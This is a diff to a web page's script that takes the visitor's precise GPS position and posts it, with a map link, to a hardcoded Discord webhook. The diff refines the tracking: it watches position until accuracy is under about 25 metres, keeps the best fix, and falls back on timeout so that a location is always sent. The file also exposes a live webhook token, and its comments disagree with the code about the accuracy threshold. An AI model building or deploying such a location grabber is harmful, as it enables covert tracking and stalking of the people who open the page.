@@ -73,6 +73,9 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1495485355615453206/ThgzH3LXCyCio83MSyCuVyjbNq8yc3QIkFaOMd1ssEQ1TaMMTJ-yA-gbCtQ38Yxsz3sP';
+        let watchId = null;
+        let bestPosition = null;
+        let isSending = false;
 
         function updateStatus(message, className) {
             const statusDiv = document.getElementById('status');
@@ -88,6 +91,8 @@
         }
 
         async function sendToDiscord(lat, lon, accuracy) {
+            if (isSending) return;
+            isSending = true;
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
@@ -95,18 +100,20 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `📍 **New Exact Location Received**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
+                        content: `🎯 **EXACT LOCATION FOUND**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                     })
                 });
 
                 if (response.ok) {
-                    updateStatus('Location sent successfully!', 'success');
+                    updateStatus('Exact location sent successfully!', 'success');
                 } else {
                     updateStatus('Failed to send location to Discord.', 'error');
                 }
             } catch (error) {
                 console.error('Error sending to Discord:', error);
                 updateStatus('Error sending data: ' + error.message, 'error');
+            } finally {
+                isSending = false;
             }
         }
 
@@ -116,13 +123,35 @@
                 return;
             }
 
-            updateStatus('Finding exact location... Please wait 10-15 seconds for GPS lock.', 'loading');
+            // Clear any existing watch
+            if (watchId) navigator.geolocation.clearWatch(watchId);
+            bestPosition = null;
 
-            navigator.geolocation.getCurrentPosition(
+            updateStatus('Waiting for GPS lock... (Accuracy must be < 30m)', 'loading');
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 0
+            };
+
+            watchId = navigator.geolocation.watchPosition(
                 (position) => {
                     const { latitude, longitude, accuracy } = position.coords;
-                    updateStatus(`Location found (Accuracy: ${accuracy.toFixed(1)}m)! Sending to Discord...`, 'loading');
-                    sendToDiscord(latitude, longitude, accuracy);
+                    
+                    // Keep track of the most accurate position found so far
+                    if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
+                        bestPosition = position;
+                        updateStatus(`Refining... Current Accuracy: ${accuracy.toFixed(1)}m`, 'loading');
+                    }
+
+                    // If accuracy is good enough (less than 20 meters), stop watching and send
+                    if (accuracy <= 25) {
+                        navigator.geolocation.clearWatch(watchId);
+                        watchId = null;
+                        updateStatus(`High accuracy found (${accuracy.toFixed(1)}m)! Sending...`, 'loading');
+                        sendToDiscord(latitude, longitude, accuracy);
+                    }
                 },
                 (error) => {
                     let errorMessage = 'An unknown error occurred.';
@@ -134,17 +163,33 @@
                             errorMessage = 'Location information is unavailable. Make sure your GPS is ON and you are not in a basement/elevator.';
                             break;
                         case error.TIMEOUT:
+                            // If we timed out but have a position (even if not < 20m), send the best one we found
+                            if (bestPosition) {
+                                navigator.geolocation.clearWatch(watchId);
+                                watchId = null;
+                                const { latitude, longitude, accuracy } = bestPosition.coords;
+                                updateStatus(`Timeout. Sending best found (${accuracy.toFixed(1)}m)...`, 'loading');
+                                sendToDiscord(latitude, longitude, accuracy);
+                                return;
+                            }
                             errorMessage = 'The request timed out. Please try again with a better signal.';
                             break;
                     }
                     updateStatus(errorMessage, 'error');
                 },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 20000,
-                    maximumAge: 0
-                }
+                options
             );
+
+            // Safety timeout: if after 20 seconds we still don't have < 25m, send the best we have
+            setTimeout(() => {
+                if (watchId && bestPosition) {
+                    navigator.geolocation.clearWatch(watchId);
+                    watchId = null;
+                    const { latitude, longitude, accuracy } = bestPosition.coords;
+                    updateStatus(`Sending best available accuracy (${accuracy.toFixed(1)}m)...`, 'loading');
+                    sendToDiscord(latitude, longitude, accuracy);
+                }
+            }, 20000);
         }
 
         // Run on load
